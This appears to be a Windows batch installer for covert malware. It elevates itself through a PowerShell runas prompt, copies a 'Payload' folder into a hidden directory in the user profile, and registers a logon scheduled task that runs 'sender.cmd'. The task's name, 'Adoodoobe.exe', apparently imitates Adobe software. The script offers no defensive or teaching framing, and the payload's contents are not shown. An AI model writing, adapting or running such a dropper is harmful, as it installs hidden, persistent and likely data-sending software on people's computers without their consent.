@echo off
color 0F

:elevate 

:: create a powershell instance, and restart the batch script with elevated permissions

net file 1>NUL 2>NUL
if not '%errorlevel%' == '0' (
    powershell Start-Process -FilePath "%0" -ArgumentList "%cd%" -verb runas >NUL 2>&1 
    exit /b
)
cd /d %1

:movefiles

:: moves files to correct locations

mkdir "C://Users/%USERNAME%/scd"
attrib +h "C://Users/%USERNAME%/scd"
robocopy "./Payload" "C://Users/%USERNAME%/scd/" /e /copyall


:setupsced

:: creates new sceduled task to run on startup

schtasks /create /sc ONLOGON /tn Adoodoobe.exe /tr "C://Users/%USERNAME%/scd/sender.cmd"

:end
